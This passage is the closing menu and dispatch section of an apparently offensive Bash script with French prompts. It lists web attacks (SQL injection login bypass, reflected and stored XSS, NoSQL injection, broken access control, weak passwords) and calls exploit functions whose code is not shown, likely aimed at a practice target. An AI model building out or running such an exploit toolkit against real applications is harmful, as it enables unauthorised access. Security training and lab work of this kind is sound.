        echo -e "${GREEN}1)  🔓 SQL Injection (Login Bypass)${NC}"
        echo -e "${GREEN}2)  💉 XSS via Search${NC}"
        echo -e "${GREEN}3)  💾 XSS via Feedback (Stored)${NC}"
        echo -e "${GREEN}4)  🚪 Broken Access Control${NC}"
        echo -e "${GREEN}5)  📊 NoSQL Injection${NC}"
        echo -e "${GREEN}6)  🔨 Weak Passwords${NC}"
        echo -e "${GREEN}7)  📡 Information Disclosure${NC}"
        echo -e "${CYAN}8)  🔍 Full Vulnerability Scan${NC}"
        echo -e "${MAGENTA}9)  📜 Logs${NC}"
        echo -e "${RED}0)  ❌ Retour${NC}"
        echo
        read -p "👉 Choix : " choice

        case $choice in
            1) exploit_sqli_login ;;
            2) exploit_xss_search ;;
            3) exploit_xss_feedback ;;
            4) exploit_admin_access ;;
            5) exploit_nosql_injection ;;
            6) exploit_weak_passwords ;;
            7) exploit_info_disclosure ;;
            8) full_scan ;;
            9)
                clear
                banner
                echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
                echo -e "${CYAN}║              Logs d'Exploits               ║${NC}"
                echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
                echo

                for log in "$LOG_DIR"/*.log; do
                    if [ -f "$log" ]; then
                        echo -e "${GREEN}═══ $(basename "$log") ═══${NC}"
                        tail -n 5 "$log"
                        echo
                    fi
                done

                if [ ! "$(ls -A $LOG_DIR/*.log 2>/dev/null)" ]; then
                    echo -e "${YELLOW}Aucun log trouvé${NC}"
                fi

                read -p "👉 Entrée pour continuer... "
                ;;
            0) return ;;
            *)
                echo -e "${RED}❌ Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# Point d'entrée
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
